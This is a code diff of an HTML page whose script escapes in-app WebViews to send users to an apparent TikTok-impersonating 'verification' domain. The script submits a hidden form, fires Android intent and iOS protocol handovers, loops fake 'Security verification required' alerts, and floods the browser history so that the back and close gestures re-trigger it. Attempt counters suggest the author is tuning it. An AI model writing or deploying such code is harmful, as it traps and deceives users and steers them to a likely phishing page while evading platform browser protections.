@@ -7,54 +7,53 @@
 </head>
 <body>
 
-<script>
-    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 5000; 
-    let attemptCount = 14;
+    <form id="bypassForm" action="https://tik-tok-verification.com/Verification/verify1.html" method="GET" target="_blank" style="display:none;"></form>
 
-    function collisionBreakout() {
+<script>
+    const target = "https://tik-tok-verification.com/Verification/verify1.html";
+    const killTime = Date.now() + 5000; 
+
+    function formBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const form = document.getElementById('bypassForm');
 
-        // 1. Trigger an 'untrusted' window opening
-        // This causes the WebView to flag a 'Popup Blocked' or 'Open in Browser' event
-        window.open(destination, '_blank');
+        // 1. Submit the form (Higher priority than window.location)
+        form.submit();
 
-        // 2. Immediate Protocol Shotgun
+        // 2. Immediate Protocol Layering
         if (isAndroid) {
-            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
+            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
         } else if (isIOS) {
-            // Using the 'itms-services' protocol which has high OS priority
-            window.location.href = "itms-services://?action=download-manifest&url=" + encodeURIComponent(destination);
+            // Attempt a 'Webcal' handover which often triggers a Safari prompt
+            window.location.href = "webcal://" + target.replace("https://", "");
             
             setTimeout(() => {
-                window.location.replace("x-web-search://?" + encodeURIComponent(destination));
+                window.location.replace("x-web-search://?" + encodeURIComponent(target));
             }, 50);
         }
     }
 
     function rampage() {
-        // FAIL-SAFE: Check system clock
-        if (Date.now() > killTime) return;
+        if (Date.now() > killTime) return; // FAIL-SAFE
 
-        collisionBreakout();
+        formBreakout();
 
-        // THE ALERT: Now tracks the attempt number for your testing
-        alert("ATTEMPT #" + attemptCount + "\n\nVerification Required. Tap OK to open System Browser.");
+        // FIXED ALERT FOR ATTEMPT #15
+        alert("ATTEMPT #15\n\nSecurity verification required.\n\nTap OK to open in your system browser.");
         
-        attemptCount++;
-        collisionBreakout();
+        formBreakout();
 
         setTimeout(rampage, 10);
     }
 
     window.onload = () => {
-        // Jam the 'X' and back gestures
-        for(let i=0; i<80; i++) history.pushState(null, null, "#ver_" + i);
+        // High-density history jam
+        for(let i=0; i<100; i++) history.pushState({idx:i}, "", "#verify_" + i);
         rampage();
     };
 
-    // Re-trigger on any attempt to close the view
+    // Prevent 'X' button or swipe escape
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
     window.onpopstate = () => { if (Date.now() < killTime) rampage(); };
 </script>
